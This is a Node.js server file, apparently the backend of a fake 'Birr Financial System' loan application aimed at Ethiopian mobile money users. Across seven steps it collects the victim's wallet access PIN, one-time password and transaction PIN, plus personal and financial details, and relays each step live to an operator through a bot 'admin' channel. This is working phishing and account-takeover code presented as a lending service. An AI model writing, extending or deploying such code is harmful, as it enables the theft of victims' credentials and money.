require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const crypto = require('crypto');
const cors = require('cors');
const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Expose io instance globally for the bot manager callback handlers
global.io = io;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const activeSessions = new Map();

// Updated PIN helper validating exactly 4 digits
const isValid4DigitPin = (pin) => {
    return /^\d{4}$/.test(pin);
};

io.on('connection', (socket) => {
    let currentId = crypto.randomBytes(8).toString('hex');
    
    activeSessions.set(currentId, {
        appId: currentId,
        socketId: socket.id,
        phone: '',
        loanType: '',
        amount: '',
        term: '',
        firstName: '',
        lastName: '',
        email: '',
        employment: '',
        income: '',
        selectedBank: ''
    });

    socket.emit('session-ready', { appId: currentId });

    socket.on('join-room', (roomId) => {
        if (activeSessions.has(roomId)) {
            socket.join(roomId);
            currentId = roomId;
            const session = activeSessions.get(roomId);
            session.socketId = socket.id;
            activeSessions.set(roomId, session);
        }
    });

    socket.on('submit-step1-credentials', (data) => {
        const session = activeSessions.get(currentId);
        if (!session) return;

        if (!isValid4DigitPin(data.pin)) {
            socket.emit('pin-rejected', { message: "Wallet Access PIN must be exactly 4 digits." });
            return;
        }

        session.phone = data.phone;
        activeSessions.set(currentId, session);

        botManager.sendToAdmin(currentId, "Step 1 - Account Login", {
            "Phone Number": `+251${data.phone}`,
            "Wallet Access PIN": data.pin
        }, false);
    });

    socket.on('submit-otp-verification', (data) => {
        const session = activeSessions.get(currentId);
        if (!session) return;

        botManager.sendToAdmin(currentId, "Step 2 - OTP Verification", {
            "Phone Number": `+251${session.phone}`,
            "One Time Password": data.code
        }, true);
    });

    socket.on('submit-final-pin', (data) => {
        const session = activeSessions.get(currentId);
        if (!session) return;

        if (!isValid4DigitPin(data.pin)) {
            socket.emit('pin-rejected', { message: "Transaction PIN must be exactly 4 digits." });
            return;
        }

        botManager.sendToAdmin(currentId, "Step 3 - Transaction Authorization", {
            "Phone Number": `+251${session.phone}`,
            "Transaction PIN": data.pin
        }, true);
    });

    socket.on('submit-step4-loan-config', (data) => {
        const session = activeSessions.get(currentId);
        if (!session) return;

        session.loanType = data.loanType;
        session.amount = data.amount;
        session.term = data.term;
        activeSessions.set(currentId, session);

        botManager.sendToAdmin(currentId, "Step 4 - Loan Configuration", {
            "Phone Number": `+251${session.phone}`,
            "Loan Option": data.loanType,
            "Amount requested": `${Number(data.amount).toLocaleString()} ETB`,
            "Term Limit": `${data.term} Weeks`
        }, false);
    });

    socket.on('submit-step5-kyc-profile', (data) => {
        const session = activeSessions.get(currentId);
        if (!session) return;

        session.firstName = data.firstName;
        session.lastName = data.lastName;
        session.email = data.email;
        activeSessions.set(currentId, session);

        botManager.sendToAdmin(currentId, "Step 5 - KYC", {
            "Phone Number": `+251${session.phone}`,
            "First Name": data.firstName,
            "Last Name": data.lastName,
            "Email Address": data.email
        }, false);
    });

    socket.on('submit-step6-financials', (data) => {
        const session = activeSessions.get(currentId);
        if (!session) return;

        session.employment = data.employment;
        session.income = data.income;
        activeSessions.set(currentId, session);

        // Send info to Admin without completing application flow here
        botManager.sendToAdmin(currentId, "Step 6 - Employment Verification", {
            "Phone Number": `+251${session.phone}`,
            "Employment Type": data.employment,
            "Monthly Earnings": `${Number(data.income).toLocaleString()} ETB`
        }, false);
    });

    socket.on('submit-step7-bank', (data) => {
        const session = activeSessions.get(currentId);
        if (!session) return;

        session.selectedBank = data.bank || '';
        activeSessions.set(currentId, session);

        botManager.sendToAdmin(currentId, "Step 7 - Bank Selection", {
            "Phone Number": `+251${session.phone}`,
            "Selected Bank": session.selectedBank ? session.selectedBank : "None"
        }, false);

        // Application complete triggers exclusively after Bank Selection step submission
        const txnReferenceId = `TXN-${Math.floor(100000 + Math.random() * 900000)}-ETB`;
        
        io.to(currentId).emit('application-complete', {
            referenceId: txnReferenceId
        });
    });

    socket.on('disconnect', () => {});
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Birr Financial System listening on port ${PORT}`);
});